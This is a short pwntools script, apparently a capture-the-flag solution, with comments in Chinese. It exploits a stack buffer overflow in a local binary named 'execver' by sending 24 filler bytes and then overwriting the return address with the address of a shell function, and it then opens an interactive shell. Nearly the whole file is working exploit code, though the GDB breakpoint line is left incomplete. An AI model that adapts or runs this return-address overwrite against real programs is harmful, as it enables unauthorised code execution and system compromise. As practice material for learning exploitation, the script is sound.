from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.binary = "./execver"

# 启动进程
p = process("./execver")
offset = 24 # 偏移量，填充到ret地址
flag_addr = 0x004005b6 # shell函数地址

gdb.attach(p, gdbscript="""
    b 
""")

payload = b"$" * offset + p64(flag_addr)
p.sendline(payload)




# p.interactive()

# 附加 GDB


# 交互
p.interactive()